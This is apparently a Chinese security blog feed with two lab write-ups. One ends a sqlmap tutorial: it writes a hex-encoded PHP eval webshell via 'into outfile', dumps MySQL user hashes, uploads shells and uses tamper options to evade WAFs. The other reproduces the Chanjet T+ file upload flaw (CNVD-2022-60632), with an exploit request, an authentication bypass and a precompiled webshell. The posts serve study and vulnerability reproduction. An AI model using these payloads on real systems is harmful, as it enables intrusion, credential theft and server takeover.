安装路径 <code>select @@secure_file_priv,@@datadir,@@basedir</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029180221656.png" data-caption="image-20221029180221656"><img src="/../images/sqlmap/image-20221029180221656.png" alt="image-20221029180221656"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># @@secure_file_priv</span><br><span class="line">查看数据库是否有写入、写出、或指定具体路径写入属性，用来限制导出效果。他有三个属性：</span><br><span class="line">1）null限制不能导出</span><br><span class="line">2）为空可以自定义</span><br><span class="line">3）为一个路径则只能导出到指定路径</span><br><span class="line">若上图为C:\\即为空，即可以自定义写入路径</span><br><span class="line"></span><br><span class="line"># @@basedir</span><br><span class="line">该参数指定了安装 MySQL 的安装路径（mysql安装目录）</span><br><span class="line"></span><br><span class="line"># @@datadir 参数</span><br><span class="line">该参数指定MySQL的数据文件的存放目录，数据库文件即我们常说的 MySQL data 文件。</span><br></pre></td></tr></table></figure></div><p>为 NULL 不可导出，所以得修改为空才能通过 into file 进行写入，实战中若为 NULL 则不能进一步利用</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029180535990.png" data-caption="image-20221029180535990"><img src="/../images/sqlmap/image-20221029180535990.png" alt="image-20221029180535990"></a></p><p>在 Mysql 文件中的 my.ini 添加 <code>secure_file_priv=&quot;/&quot;</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029184518955.png" data-caption="image-20221029184518955"><img src="/../images/sqlmap/image-20221029184518955.png" alt="image-20221029184518955"></a></p><p>再次探测，<code>@@secure_file_priv</code> 已变为 C:\</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029184439988.png" data-caption="image-20221029184439988"><img src="/../images/sqlmap/image-20221029184439988.png" alt="image-20221029184439988"></a></p><p>通过into outfile 写入 webshell, 注入点闭合语句+回显点+(ox+webshell十六进制)+”网站绝对路径”</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs-funsiooo.com:8001/Less-7/?id=1&#x27;)) union select 1,2,0x3c3f706870206576616c28245f504f53545b2774657374275d293f3e into outfile &quot;C:\\phpstudy_pro\\WWW\\www.sqli-labs-funsiooo.com\\Less-7\\1.php&quot; --+</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029185203640.png" data-caption="image-20221029185203640"><img src="/../images/sqlmap/image-20221029185203640.png" alt="image-20221029185203640"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029213150700.png" data-caption="image-20221029213150700"><img src="/../images/sqlmap/image-20221029213150700.png" alt="image-20221029213150700"></a></p><p>未写入前</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029184722537.png" data-caption="image-20221029184722537"><img src="/../images/sqlmap/image-20221029184722537.png" alt="image-20221029184722537"></a></p><p>写入后</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029185105234.png" data-caption="image-20221029185105234"><img src="/../images/sqlmap/image-20221029185105234.png" alt="image-20221029185105234"></a></p><p>通过蚁剑进行连接</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029185419868.png" data-caption="image-20221029185419868"><img src="/../images/sqlmap/image-20221029185419868.png" alt="image-20221029185419868"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029185554953.png" data-caption="image-20221029185554953"><img src="/../images/sqlmap/image-20221029185554953.png" alt="image-20221029185554953"></a></p><p>sql-shell 中通过以下这条命令，可以查询数据库的用户和密码 <code>sql-shell&gt; select host,user,password from mysql.user</code></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029185835833.png" data-caption="image-20221029185835833"><img src="/../images/sqlmap/image-20221029185835833.png" alt="image-20221029185835833"></a></p><h4 id="file-read"><a href="#file-read" class="headerlink" title="file-read"></a>file-read</h4><p>当数据库为 MySQL、PostgreSQL 或 SQL Server，并且当前用户有权限时，可以读取指定文件。</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029223918619.png" data-caption="image-20221029223918619"><img src="/../images/sqlmap/image-20221029223918619.png" alt="image-20221029223918619"></a></p><p>执行命令 <code>python sqlmap.py -u &quot;http://www.sqli-labs-funsiooo.com:8001/Less-5/?id=1&quot; --file-read &quot;C:\Users\Public\test.txt&quot;</code> 成功读取，并将文件保存在电脑 <code>C:\Users\Boom\AppData\Local\sqlmap\output\www.sqli-labs-funsiooo.com\files</code> 下</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029224405312.png" data-caption="image-20221029224405312"><img src="/../images/sqlmap/image-20221029224405312.png" alt="image-20221029224405312"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029224443986.png" data-caption="image-20221029224443986"><img src="/../images/sqlmap/image-20221029224443986.png" alt="image-20221029224443986"></a></p><h4 id="file-write、file-dest"><a href="#file-write、file-dest" class="headerlink" title="file-write、file-dest"></a>file-write、file-dest</h4><p>当数据库为MySQL、Postgre SQL或者Sql Server(通过powershell写入)，并且当前用户有权限向任意目录写文件的时候，可以上传文件到数据库服务器。我们可以上传木马进行 getshell</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://www.sqli-labs-funsiooo.com:8001/Less-5/?id=1&quot; --file-write C:\Users\Boom\Desktop\sql_upload\shell.php --file-dest &quot;C:\phpstudy_pro\WWW\www.sqli-labs-funsiooo.com\shell-2.php&quot;</span><br></pre></td></tr></table></figure></div><p>成功上传</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029232542537.png" data-caption="image-20221029232542537"><img src="/../images/sqlmap/image-20221029232542537.png" alt="image-20221029232542537"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029232506161.png" data-caption="image-20221029232506161"><img src="/../images/sqlmap/image-20221029232506161.png" alt="image-20221029232506161"></a></p><p>为上传前</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029232153105.png" data-caption="image-20221029232153105"><img src="/../images/sqlmap/image-20221029232153105.png" alt="image-20221029232153105"></a></p><p>上传后</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029232659447.png" data-caption="image-20221029232659447"><img src="/../images/sqlmap/image-20221029232659447.png" alt="image-20221029232659447"></a></p><p>连接 Webshell，这里使用冰蝎4 虽然上传成功但连接不成功，以下换回冰蝎3才能成功连接</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029232331747.png" data-caption="image-20221029232331747"><img src="/../images/sqlmap/image-20221029232331747.png" alt="image-20221029232331747"></a></p><h3 id="定制化参数"><a href="#定制化参数" class="headerlink" title="定制化参数"></a>定制化参数</h3><p>有时候通过测试发现存在 sql 注入，但利用 sqlmap 进行验证时发现却不能检测出来存在注入，这时候就需要根据实际情况对 sqlmap 请求参数进行处理</p><p>抓取数据包，将 Request 请求复制保存为 .txt 文件，放置到 sqlmap 目录下。</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029221914451.png" data-caption="image-20221029221914451"><img src="/../images/sqlmap/image-20221029221914451.png" alt="image-20221029221914451"></a></p><p>直接对数据包进行验证，sqlmap 没有发现漏洞</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029222203157.png" data-caption="image-20221029222203157"><img src="/../images/sqlmap/image-20221029222203157.png" alt="image-20221029222203157"></a></p><p>我们将探测等级提升至 –level 3 ，再次进行测试，sqlmap 可发现漏洞的存在</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029222231713.png" data-caption="image-20221029222231713"><img src="/../images/sqlmap/image-20221029222231713.png" alt="image-20221029222231713"></a></p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029222252599.png" data-caption="image-20221029222252599"><img src="/../images/sqlmap/image-20221029222252599.png" alt="image-20221029222252599"></a></p><p>这只是一个小例子，我们实战中可能对存在 WAF 或其限制，我们可以通过一步步调试 sqlmap 参数进行测试，比如我们为了逃避系统的检测我们可以使用 –random-agent 变换 User-Agent 头，–technique 指定注入类型， –tamper 指定脚本等等指令进行调试，除此之外，我们还可以通过 -v 参数查看 sqlmap 的测试 payload 机制，研究其 payload 的组成，搭配temper 能更好的分析其 bypass 机制。</p><p><a data-fancybox="gallery" data-src="/../images/sqlmap/image-20221029223129493.png" data-caption="image-20221029223129493"><img src="/../images/sqlmap/image-20221029223129493.png" alt="image-20221029223129493"></a></p><p>本人常用命令 <code>sqlmap.py -r data.txt --levle 3 -p username --dbs --tamper space2morecomment --random-agent --ignore-redirects --ignore-proxy --technique=B</code></p><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>通过案例学习 sqlmap 的基本使用，最大程度自动化测试，工具只是辅助，对于 SQL 注入这里类型，还是得打好基础，理解其原理，本人也一直在持续学习中，把它研究透还是得需要点时间。当然 sqlmap 作为成熟的自动化工具，其功能不止以上所阐述的这么少，其余功能有待挖掘。</p><h2 id="七、参考"><a href="#七、参考" class="headerlink" title="七、参考"></a>七、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.yang99.top/index.php/archives/30/</span><br><span class="line">https://www.anquanke.com/post/id/235846</span><br><span class="line">https://blog.yd0ng.com/2020/09/07/SQLMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E5%8F%8Atamper%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/</span><br><span class="line">https://www.cnblogs.com/fzblog/p/13800604.html</span><br><span class="line">https://sqlmap.kvko.live/usage</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>畅捷通任意文件上传漏洞复现分析过程 CNVD-2022-60632</title>
      <link href="/2022/10/26/%E7%95%85%E6%8D%B7%E9%80%9A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B-CNVD-2022-60632/"/>
      <url>/2022/10/26/%E7%95%85%E6%8D%B7%E9%80%9A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B-CNVD-2022-60632/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>值守期间看到网上师傅的文章，于是就有以下这篇文章。漏洞影响版本：畅捷通T+单机版&lt;&#x3D;17.0且使用IIS10.0以下版本，漏洞点 <code>tplus/SM/SetupAccount/Upload.aspx?preload=1</code>。</p><h2 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h2><p>1、选择下载安装，<a href="https://dad.chanapp.chanjet.com/TplusYZHJ17.0.zip">https://dad.chanapp.chanjet.com/TplusYZHJ17.0.zip</a> 这边选择迅雷下载，解压后选择标准版安装，记得按照提示先关闭杀毒软件，安装过程比较慢，需要等待一段时间。</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024024825548.png" data-caption="image-20221024024825548"><img src="/../images/chanjet/image-20221024024825548.png" alt="image-20221024024825548"></a></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024025122968.png" data-caption="image-20221024025122968"><img src="/../images/chanjet/image-20221024025122968.png" alt="image-20221024025122968"></a></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024025141554.png" data-caption="image-20221024025141554"><img src="/../images/chanjet/image-20221024025141554.png" alt="image-20221024025141554"></a></p><p>安装过程中提示设置数据库，这里选择关闭，不进行数据库配置</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024025910710.png" data-caption="image-20221024025910710"><img src="/../images/chanjet/image-20221024025910710.png" alt="image-20221024025910710"></a></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024025941436.png" data-caption="image-20221024025941436"><img src="/../images/chanjet/image-20221024025941436.png" alt="image-20221024025941436"></a></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024030340481.png" data-caption="image-20221024030340481"><img src="/../images/chanjet/image-20221024030340481.png" alt="image-20221024030340481"></a></p><p>安装完成后，点击桌面图标即可进入访问</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024030529327.png" data-caption="image-20221024030529327"><img src="/../images/chanjet/image-20221024030529327.png" alt="image-20221024030529327"></a></p><h2 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h2><h3 id="定位漏洞点"><a href="#定位漏洞点" class="headerlink" title="定位漏洞点"></a>定位漏洞点</h3><p>在路径 <code>C:\Program Files (x86)\Chanjet\TPlusStd</code> 找到安装后的源码</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024031412457.png" data-caption="image-20221024031412457"><img src="/../images/chanjet/image-20221024031412457.png" alt="image-20221024031412457"></a></p><p>根据网上 Payload 定位漏洞点 <code>tplus/SM/SetupAccount/Upload.aspx?preload=1</code>，系统采用了预编译（注：预编译即在安装时系统进行了预编译处理，即系统在用户第一次访问前已进行预先编译，当用户访问时不要再次进行编译，使用户第一次访问时的响应速度更快，也保护了源代码的安全，一定程度上避免了源码泄露造成的风险，但缺点也很明显，若需要进行修改则整个程序需要重新编译发行）</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024031827118.png" data-caption="image-20221024031827118"><img src="/../images/chanjet/image-20221024031827118.png" alt="image-20221024031827118"></a></p><p>经过浏览源码发现，成套程序都进行了预编译处理，无法查看其源代码（当 ASP.NET 部署了预编译的应用程序后，会调用 Bin 文件夹中的程序集来进行处理请求，其中编辑器程序集和文件扩展名为 .compiled，程序集名称由编译器生成， .compiled 文件内容不包含可执行代码，只包含 ASP.NET 查找相应的程序集所需的信息。预编译文件只是一个占位符，若需要找到源码则可能需要反编译 .dll 文件。）</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024032632804.png" data-caption="image-20221024032632804"><img src="/../images/chanjet/image-20221024032632804.png" alt="image-20221024032632804"></a></p><p>我们找到漏洞点文件相对应对的 .compiled 文件，通过查找对比，找到对应的 .compiled 文件：<code>bin/upload.aspx.9475d17f.compiled</code></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024034159504.png" data-caption="image-20221024034159504"><img src="/../images/chanjet/image-20221024034159504.png" alt="image-20221024034159504"></a></p><p>根据 upload.aspx 对应的 .compiled 文件定位到程序集文件 App_Web_upload.aspx.9475d17f</p><div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">preserve</span> <span class="attr">resultType</span>=<span class="string">&quot;3&quot;</span> <span class="attr">virtualPath</span>=<span class="string">&quot;/WebSite/SM/SetupAccount/Upload.aspx&quot;</span> <span class="attr">hash</span>=<span class="string">&quot;16f32931f&quot;</span> <span class="attr">filehash</span>=<span class="string">&quot;8aff27fcb5b4a92d&quot;</span> <span class="attr">flags</span>=<span class="string">&quot;110000&quot;</span> <span class="attr">assembly</span>=<span class="string">&quot;App_Web_upload.aspx.9475d17f&quot;</span> <span class="attr">type</span>=<span class="string">&quot;ASP.sm_setupaccount_upload_aspx&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filedeps</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filedep</span> <span class="attr">name</span>=<span class="string">&quot;/WebSite/SM/SetupAccount/Upload.aspx&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filedep</span> <span class="attr">name</span>=<span class="string">&quot;/WebSite/SM/SetupAccount/Upload.aspx.cs&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filedeps</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">preserve</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024035613099.png" data-caption="image-20221024035613099"><img src="/../images/chanjet/image-20221024035613099.png" alt="image-20221024035613099"></a></p><h3 id="dll反编译分析"><a href="#dll反编译分析" class="headerlink" title="dll反编译分析"></a>dll反编译分析</h3><p>使用 dnSpy 对 <code>App_Web_upload.aspx.9475d17f</code> 进行调试（注：dnSpy 是一个调试器和 .NET 程序集编辑器。即使您没有任何可用的源代码，您也可以使用它来编辑和调试程序集,在线逆向），项目地址 <code>https://github.com/dnSpy/dnSpy</code>，这里直接搜索 <code>App_Web_upload.aspx.9475d17f</code> 拉进 dnSpy 即可</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024040132466.png" data-caption="image-20221024040132466"><img src="/../images/chanjet/image-20221024040132466.png" alt="image-20221024040132466"></a></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024040248526.png" data-caption="image-20221024040248526"><img src="/../images/chanjet/image-20221024040248526.png" alt="image-20221024040248526"></a></p><p>通过分析定位到漏洞页面源码</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024040625235.png" data-caption="image-20221024040625235"><img src="/../images/chanjet/image-20221024040625235.png" alt="image-20221024040625235"></a></p><p>源码如下：</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// CommonPage_SetupAccount_Upload</span><br><span class="line">// Token: 0x06000004 RID: 4 RVA: 0x000020AC File Offset: 0x000002AC</span><br><span class="line">protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">this.ReadResources();</span><br><span class="line">if (base.Request.Files.Count == 1)</span><br><span class="line">&#123;</span><br><span class="line">string text = &quot;images/index.gif&quot;;</span><br><span class="line">object obj = this.ViewState[&quot;fileName&quot;];</span><br><span class="line">if (obj != null)</span><br><span class="line">&#123;</span><br><span class="line">text = obj.ToString();</span><br><span class="line">&#125;</span><br><span class="line">if (this.File1.PostedFile.ContentLength &gt; 204800)</span><br><span class="line">&#123;</span><br><span class="line">base.Response.Write(string.Concat(new string[]</span><br><span class="line">&#123;</span><br><span class="line">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;,</span><br><span class="line">this.PhotoTooLarge,</span><br><span class="line">&quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;,</span><br><span class="line">text,</span><br><span class="line">&quot;&#x27;;&lt;/script&gt;&quot;</span><br><span class="line">&#125;));</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">if (this.File1.PostedFile.ContentType != &quot;image/jpeg&quot; &amp;&amp; this.File1.PostedFile.ContentType != &quot;image/bmp&quot; &amp;&amp; this.File1.PostedFile.ContentType != &quot;image/gif&quot; &amp;&amp; this.File1.PostedFile.ContentType != &quot;image/pjpeg&quot;)</span><br><span class="line">&#123;</span><br><span class="line">base.Response.Write(string.Concat(new string[]</span><br><span class="line">&#123;</span><br><span class="line">&quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;,</span><br><span class="line">this.PhotoTypeError,</span><br><span class="line">&quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;,</span><br><span class="line">text,</span><br><span class="line">&quot;&#x27;;&lt;/script&gt;&quot;</span><br><span class="line">&#125;));</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">string fileName = this.File1.PostedFile.FileName;</span><br><span class="line">string text2 = fileName.Substring(fileName.LastIndexOf(&#x27;\\&#x27;) + 1);</span><br><span class="line">this.File1.PostedFile.SaveAs(base.Server.MapPath(&quot;.&quot;) + &quot;\\images\\&quot; + text2);</span><br><span class="line">string value = base.Server.MapPath(&quot;.&quot;) + &quot;\\images\\&quot; + text2;</span><br><span class="line">this.ViewState[&quot;fileName&quot;] = &quot;images/&quot; + text2;</span><br><span class="line">TPContext.Current.Session[&quot;ImageName&quot;] = value;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>根据获取到的源码进行分析</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024041444451.png" data-caption="image-20221024041444451"><img src="/../images/chanjet/image-20221024041444451.png" alt="image-20221024041444451"></a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>原理了解，实践开始，通过 Burp 抓包，构造语句，我这里使用 Windows 自带浏览器进行流量代理，因为使用 Chrome 无法进行抓包</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024042906233.png" data-caption="image-20221024042906233"><img src="/../images/chanjet/image-20221024042906233.png" alt="image-20221024042906233"></a></p><p>访问 <code>/tplus/SM/SetupAccount/Upload.aspx</code> 路径进行抓包，这里直接替换为参考文章师傅的数据包即可，修改 IP 为本地 IP</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /tplus/SM/SetupAccount/Upload.aspx HTTP/1.1</span><br><span class="line">Host: 192.168.114.144</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: ASP.NET_SessionId=gvigofzulthd2v1i2q5zndtf; Hm_lvt_fd4ca40261bc424e2d120b806d985a14=1662302093; Hm_lpvt_fd4ca40261bc424e2d120b806d985a14=1662302093</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywwk2ReqGTj7lNYlt</span><br><span class="line">Content-Length: 182</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarywwk2ReqGTj7lNYlt</span><br><span class="line">Content-Disposition: form-data; name=&quot;File1&quot;;filename=&quot;test.aspx&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundarywwk2ReqGTj7lNYlt--</span><br></pre></td></tr></table></figure></div><p>系统提示需要登录</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024043859326.png" data-caption="image-20221024043859326"><img src="/../images/chanjet/image-20221024043859326.png" alt="image-20221024043859326"></a></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024043922964.png" data-caption="image-20221024043922964"><img src="/../images/chanjet/image-20221024043922964.png" alt="image-20221024043922964"></a></p><p>其实根据披露的入口点为 <code>tplus/SM/SetupAccount/Upload.aspx?preload=1</code>，我们直接替换为这个路径即可，但参考文章中的师傅给出了分析，我们就继续跟进学习一下其原理。根据提示上传文件需要登录，那就需要寻找系统鉴权的代码进行分析，分析其鉴权方式，以及是否存在绕过的可能。</p><p>根据分析 <code>App_Web_upload.aspx.9475d17f</code> 的代码，在此处并没有发现鉴权的地方</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024054329571.png" data-caption="image-20221024054329571"><img src="/../images/chanjet/image-20221024054329571.png" alt="image-20221024054329571"></a></p><p>向上回溯，发现其引用了 <code>APP.global.asax</code> ，对应的程序集名字为 <code>APP_Web_global.asax.cs.cdcab7d2</code></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024060249466.png" data-caption="image-20221024060249466"><img src="/../images/chanjet/image-20221024060249466.png" alt="image-20221024060249466"></a></p><p>直接双击进入其程序集，获取其 dll 文件源码，翻看代码发现 <code>Application_PreRequestHandlerExecute</code> 函数中定义若 <code>preload</code> 参数 &#x3D;&#x3D; 1 则不进行 session 认证</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024061347375.png" data-caption="image-20221024061347375"><img src="/../images/chanjet/image-20221024061347375.png" alt="image-20221024061347375"></a></p><p>整合信息，漏洞路径为 <code>tplus/SM/SetupAccount/Upload.aspx?preload=1</code>，修改 POST 请求路径，再次尝试进行文件上传</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024062024119.png" data-caption="image-20221024062024119"><img src="/../images/chanjet/image-20221024062024119.png" alt="image-20221024062024119"></a> </p><p>文件成功上传至 <code>\WebSite\SM\SetupAccount\images</code> 目录下</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024062222705.png" data-caption="image-20221024062222705"><img src="/../images/chanjet/image-20221024062222705.png" alt="image-20221024062222705"></a></p><p>上传 webshell 文件</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024063740516.png" data-caption="image-20221024063740516"><img src="/../images/chanjet/image-20221024063740516.png" alt="image-20221024063740516"></a></p><p>虽然文件成功上传了，但当我们进行访问的时候，发现页面报错了，原因是我们上传的文件的时候没有进行预编译，所以系统无法识别</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024072123338.png" data-caption="image-20221024072123338"><img src="/../images/chanjet/image-20221024072123338.png" alt="image-20221024072123338"></a></p><p>绕过系统限制，全局搜索，利用系统 <code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727</code> 中的 <code>aspnet_compiler.exe</code>, 生成程序集，绕过预编译机制</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024070455365.png" data-caption="image-20221024070455365"><img src="/../images/chanjet/image-20221024070455365.png" alt="image-20221024070455365"></a></p><p>Cmd 执行，<code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;aspnet_compiler -v \ -p C:\Users\Boom\Desktop\TPlus\shell C:\Users\Boom\Desktop\TPlus\upfile -fixednames</code> ，-p 代表的是你木马的目录。 C:\Users\Boom\Desktop\TPlus\upfile 表示生成的 .dll 文件在哪个目录中</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024073401113.png" data-caption="image-20221024073401113"><img src="/../images/chanjet/image-20221024073401113.png" alt="image-20221024073401113"></a></p><p>生成文件如下</p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024073739122.png" data-caption="image-20221024073739122"><img src="/../images/chanjet/image-20221024073739122.png" alt="image-20221024073739122"></a></p><p><a data-fancybox="gallery" data-src="/../images/chanjet/image-20221024073802424.png" data-caption="image-20221024073802424"><img src="/../images/chanjet/image-20221024073802424.png" alt="image-20221024073802424"></a></p><p>这里更换为冰蝎马利用成功，将 &#x2F;bin 文件夹目录下面的 .dll 文件及预编译后的 shell 文件上传到网站 &#x2F;bin 目录 <code>C:\Program Files (x86)\Chanjet\TPlusStd\WebSite\bin</code></p><p><a 